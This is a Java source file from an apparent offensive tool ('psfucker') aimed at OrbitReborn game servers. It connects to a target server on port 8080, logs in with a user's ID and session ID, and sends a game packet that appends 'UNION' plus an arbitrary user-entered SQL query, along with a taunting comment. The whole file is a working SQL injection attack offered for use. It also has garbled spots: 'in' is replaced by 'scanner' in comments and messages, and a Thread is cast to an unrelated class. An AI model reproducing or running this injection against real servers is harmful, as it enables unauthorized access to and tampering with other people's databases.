package com.manulaiko.psfucker.fuckers.orbitreborn;

import com.manulaiko.psfucker.Option;
import com.manulaiko.psfucker.net.orbitreborn.ConnectionManager;
import com.manulaiko.psfucker.utils.Tools;
import com.manulaiko.psfucker.utils.Callback;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;


/**
 * SQL injection option
 *
 * Option to execute SQL code scanner the server
 *
 * @author Manulaiko
 * @package com.manulaiko.fuckers.orbitreborn
 */
public class SqlInjection extends Option
{
    /**
     * Connection socket
     *
     * @var java.net.Socket
     */
    private Socket socket;

    /**
     * User's ID
     *
     * @var int
     */
    private int userID;

    /**
     * User's session id
     *
     * @var String
     */
    private String sessionID;

    /**
     * Flag to check if we've already tried to connect to server
     *
     * If this flags becomes true and we retry to connect and fail
     * the fucker will stop and come back to main menu
     *
     * @var boolean
     */
    private boolean alreadyTried = false;

    /**
     * ConnectionManager
     *
     * Used to interact with server
     *
     * @var com.manulaiko.net.SocketClient
     */
    private ConnectionManager connection;

    /**
     * Constructor
     *
     * @param fucker
     */
    public SqlInjection(com.manulaiko.psfucker.fuckers.OrbitReborn fucker)
    {
        super(fucker);

        this.description = "Executes SQL code scanner the server";
    }

    /**
     * Executes the fucker
     */
    public void fuck()
    {
        System.out.print("Enter your userID: ");
        this.userID = Tools.scanner.nextInt();
        System.out.print("Enter your sessionID: ");
        this.sessionID = Tools.scanner.nextLine();

        if(!connect()) {
            return;
        }

        ConnectionManager incommingPackets = (ConnectionManager)new Thread(this.connection);
        incommingPackets.start();

        incommingPackets.addCallback("on_login", new Callback() {
            @Override
            public Object call(Object object)
            {
                ConnectionManager connection = (ConnectionManager)object;
                System.out.println("You're now logged scanner!");
                System.out.print("Enter your SQL query: ");
                String query = Tools.scanner.nextLine();

                connection.send("7|play_music=1 UNION "+query+ " -- It seems you've been fucked :D ");

                System.out.println("Query executed!");
                return null;
            }
        });
        this.connection.login(userID, sessionID);
    }

    /**
     * Connects to the server
     */
    public boolean connect()
    {
        try {
            this.socket = new Socket();
            this.socket.connect(new InetSocketAddress(this.fucker.server, 8080));
            System.out.println("Connected to the server!");
            this.connection = new ConnectionManager(socket);
            return true;
        } catch(IOException e1) {
            if(alreadyTried) {
                System.out.print("Couldn't connect to the server: ");
                System.out.println(e1.getMessage());
                System.out.println("Exiting...");
                return false;
            } else {
                alreadyTried = true;
            }
            System.out.println("Couldn't connect to the server!");
            System.out.print("Re-enter server IP: ");
            String ip = Tools.scanner.nextLine();
            this.fucker.server = ip;
            connect();
        }

        return false;
    }
}
